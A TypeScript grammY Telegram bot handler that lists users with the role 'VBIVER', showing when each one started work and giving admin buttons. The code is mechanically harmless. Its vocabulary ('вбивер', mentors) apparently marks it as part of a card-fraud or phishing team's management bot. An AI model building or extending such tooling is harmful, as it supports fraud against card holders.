import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {mentorsRepository, userRepository} from "@/database";
import {getUsername} from "@/helpers/getUsername";
import {UserRole} from "@/database/models/user";
import moment from "moment";

const regex = /admin vbiver list/gmsi
export const composer = new Composer<Context>()
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const vbivers = await userRepository.find({where: {role: UserRole.VBIVER}})

    for (const vbiver of vbivers) {
        let text = `🐨 Вбивер: ${await getUsername(vbiver,true)}`
        text += `\n⌚️ На вбиве с: <code>${moment(new Date(vbiver.vbivDate)).format('DD.MM.YYYY в hh:mm')}</code>`

        let keyb = [
            [{text: 'Подробнее', callback_data: `/admin vbiver ${vbiver.tgId}`}]
        ]

        if (vbiver === vbivers[vbivers.length - 1]) {
            keyb.push([{ text: "Админ панель", callback_data: `adminMenuWithPicture` }])
        }

        await ctx.reply(text, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyb
            }
        })
        await new Promise(res => setTimeout(res, 1000 * 0.35));
    }
}